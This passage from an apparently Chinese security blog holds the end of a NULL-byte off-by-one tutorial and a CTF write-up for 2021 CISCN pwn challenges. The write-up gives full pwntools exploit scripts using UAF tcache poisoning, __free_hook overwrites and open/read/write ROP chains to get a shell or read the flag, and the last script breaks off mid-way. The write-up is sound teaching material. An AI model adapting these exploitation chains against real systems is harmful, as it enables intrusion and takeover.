class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序咋看上去没有任何问题，但是strlen和strcpy的行为不一致却导致了off-by-one的发生。<br>strlen是我们很熟悉的计算ascii字符串长度的函数，这个函数在计算字符串长度时是不把结束符<br>‘\x00’计算在内的，但是strcpy在复制字符串时会拷贝结束符’\x00’。这就导致了我们向chunk1<br>中写入了25个字节，我们使用gdb进行调试可以看到这一点。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk</span><br></pre></td></tr></table></figure><p>我们输入’A’*24后执行strcpy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure><p>可以看到next chunk的size域低字节被结束符’\x00’覆盖，这种有属于Off by one 的一个分支<br>称为NULL byte off by one ，在后面我们会看到off-by-one与NULL byte off-by-one在<br>利用上的区别。还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的CPU的字节<br>序都是小端法的，比如DWORD值在使用小端法的内存中是这样存储的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44,0x43,0x42,0x41</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2021CISCN_PWN题</title>
    <link href="/2021/06/05/2021CISCN-PWN%E9%A2%98/"/>
    <url>/2021/06/05/2021CISCN-PWN%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>大佬博客：<a href="https://nuoye-blog.github.io/2021/05/16/466a7375/">https://nuoye-blog.github.io/2021/05/16/466a7375/</a></p><h2 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h2><p>write的时候可以越界，第一次读入到0x202860处使fd非法，从而在第二次读入时会写入0，这样就可以做到写入操作。<br>通过read越界读取出libc，然后越界写入system地址到exit退出时调用的地址，并将参数修改为/bin/sh，退出程序即可getshell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26157&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;pwny&quot;</span>).libc</span><br><span class="line">def write_s(idx):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">def read_s(idx):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.send(p64(idx))</span><br><span class="line">write_s(0x100)</span><br><span class="line">write_s(0x100)</span><br><span class="line">read_s(0xFFFFFFFFFFFFFFFC)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">libc.address = int(p.recv(12),16) -0x3ec680</span><br><span class="line"><span class="built_in">print</span> hex(libc.address)</span><br><span class="line">read_s(0xFFFFFFFFFFFFFFF5)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">pie = int(p.recv(12),16)+0x58</span><br><span class="line"><span class="built_in">print</span> hex(pie)</span><br><span class="line">one = [0x4f3d5,0x4f432,0x10a41c]</span><br><span class="line">write_s((libc.address+0x61b968 - pie)/8)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">write_s((libc.address+0x61bf60 - pie)/8)</span><br><span class="line">p.sendline(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b _dl_fini&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h2><p>只有一个堆块的操作，存在UAF，修改tcache结构，使获得一个指向size位（0x80)及一个指向fd的tcache，并且设置0x90的tcache为8，然后利用上面的两个tcache修改其size为0x90，并free掉，这样即可获得libc地址。<br>然后利用UAF申请到__free_hook并修改为system地址，即可getshell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">&quot;lonelywolf&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26077&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;lonelywolf&quot;</span>).libc</span><br><span class="line">def add(size):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">def edit(data):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">def show():</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">def free():</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*0x10+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x260</span><br><span class="line"><span class="built_in">print</span> hex(heap)</span><br><span class="line">edit(p64(heap+0x10)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(p32(0)+<span class="string">&#x27;\x00\x01\x01\x08&#x27;</span>+p64(0)*10+p64(heap+0x250)*3+p64(heap+0x260))</span><br><span class="line">add(0x68)</span><br><span class="line">edit(p64(0)+p64(0x91)+p64(0)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x38)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*0x8+p64(0x31)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x3ebca0</span><br><span class="line"><span class="built_in">print</span> hex(libc.address)</span><br><span class="line">add(0x28)</span><br><span class="line">free()</span><br><span class="line">edit(p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-8)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x28)</span><br><span class="line">edit(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h2><p>劫持步骤同上，达到任意地址申请的目的后，申请到environ变量获取栈地址，从而将栈返回地址覆盖为我们的rop串，实现orw。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#p = process(&quot;silverwolf&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26121&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;silverwolf&quot;</span>).libc</span><br><span class="line">def add(size):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">def edit(data):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">def show():</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">def free():</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x1170</span><br><span class="line"><span class="built_in">print</span> hex(heap)</span><br><span class="line"></span><br><span class="line">edit(p64(heap+0x10)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">edit(p64(heap+0x10)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(p32(0)+<span class="string">&#x27;\x01\x01\x04\x08&#x27;</span>+p64(0)*10+p64(heap+0xe50)+p64(heap+0xe50+0x80)+p64(heap+0xe40)+p64(heap+0xe50))</span><br><span class="line">add(0x68)</span><br><span class="line">edit(p64(0)+p64(0x91)+p64(0)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x58)</span><br><span class="line">edit(p64(0)+p64(0x81)+p64(0)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x3ebca0</span><br><span class="line"><span class="built_in">print</span> hex(libc.address)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x28)</span><br><span class="line">add(0x68)</span><br><span class="line">free()</span><br><span class="line">edit(p64(libc.sym[<span class="string">&#x27;environ&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x68)</span><br><span class="line">add(0x68)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">stack = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0xf0-0x30</span><br><span class="line"><span class="built_in">print</span> hex(stack)</span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = 0x0000000000043ae8 + libc.address</span><br><span class="line">pop_rdi = 0x00000000000215bf + libc.address</span><br><span class="line">pop_rsi = 0x0000000000023eea + libc.address</span><br><span class="line">pop_rdx = 0x0000000000001b96 + libc.address</span><br><span class="line">syscall = 0x11B637 + libc.address</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(2)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap + 0x001960)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(4)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(4)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(3)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap + 0x1000)</span><br><span class="line">payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload1 += p64(pop_rdx)</span><br><span class="line">payload1 += p64(0x100)</span><br><span class="line">payload1 += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload1 += p64(pop_rax)</span><br><span class="line">payload1 += p64(1)</span><br><span class="line">payload1 += p64(pop_rdi)</span><br><span class="line">payload1 += p64(1)</span><br><span class="line">payload1 += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(p64(stack+0x78)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(<span class="string">&#x27;./flag\x00\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(payload1+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(0x78)</span><br><span class="line">free()</span><br><span class="line">edit(p64(stack)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(<span class="string">&#x27;./flag\x00\n&#x27;</span>)</span><br><span class="line">add(0x78)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x1056)&#x27;)</span></span><br><span class="line">edit(payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>对玩家进行位移时存在溢出，可以修改下一个chunk的size位，从而实现堆溢出攻击。利用unsortbin泄漏出libc后，申请到environ变量获取栈地址，然后将栈上的返回地址覆盖为ROP串实现ORW即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">&quot;./game&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;124.71.230.240&quot;</span>,<span class="string">&quot;26156&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./game1&quot;</span>).libc</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">def op(op):</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot;op:&quot;</span> + str(op) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">def id(id):</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot;id:&quot;</span> + str(id) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">def YMAX(y_max):</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot;w:&quot;</span> + str(y_max) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">def XMAX(x_max):</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot;l:&quot;</span> + str(x_max) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">def size(size):</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot;s:&quot;</span> + str(size) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">def init_game(xmax, ymax):</span><br><span class="line">line = <span class="string">&quot;&quot;</span></span><br><span class="line">line += op(1)</span><br><span class="line">line += XMAX(xmax)</span><br><span class="line">line += YMAX(ymax)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def create_player(_id, _size,data):</span><br><span class="line">line = <span class="string">&quot;&quot;</span></span><br><span class="line">line += op(2)</span><br><span class="line">line += id(_id)</span><br><span class="line">line += size(_size)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;desc&gt;&quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">def del_player_by_id(_id):</span><br><span class="line">line = <span class="string">&quot;&quot;</span></span><br><span class="line">line += op(3)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def display_all():</span><br><span class="line">line = <span class="string">&quot;&quot;</span></span><br><span class="line">line += op(4)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def dec_y_by_id(_id):</span><br><span class="line">line = <span class="string">&quot;&quot;</span></span><br><span class="line">line += op(5)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def inc_y_by_id(_id):</span><br><span class="line">line = <span class="string">&quot;&quot;</span></span><br><span class="line">line += op(6)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def dec_x_by_id(_id):</span><br><span class="line">line = <span class="string">&quot;&quot;</span></span><br><span class="line">line += op(7)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">def inc_x_by_id(_id):</span><br><span class="line">line = <span class="string">&quot;&quot;</span></span><br><span class="line">line += op(8)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cmd&gt;&quot;</span>)</span><br><span class="line">p.send(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">init_game(0x4, 8)</span><br><span class="line">create_player(4,0x28,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(1,0x410,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(2,0x420,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(5,0x28,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(6,0x28,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">create_player(7,0x28,<span class="string">&#x27;nuoye&#x27;</span>)</span><br><span class="line">del_player_by_id(1)</span><br><span class="line">create_player(1,0x410,<span class="string">&#x27;a&#x27;</span>*8)</span><br><span class="line">display_all()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*8)</span><br><span class="line">libc.address  = u64(p.recv(6)+<span class="string">&#x27;\x00\x00&#x27;</span>)-0x3ebca0</span><br><span class="line"><span class="built_in">print</span> hex(libc.address)</span><br><span class="line">inc_y_by_id(2)</span><br><span class="line">inc_y_by_id(2)</span><br><span class="line">del_player_by_id(1)</span><br><span class="line">create_player(1,0x410,<span class="string">&#x27;a&#x27;</span>*(0x1e8)+p64(0x251))</span><br><span class="line"><span class="comment">#del_player_by_id(2)</span></span><br><span class="line">del_player_by_id(6)</span><br><span class="line">del_player_by_id(7)</span><br><span class="line">del_player_by_id(4)</span><br><span 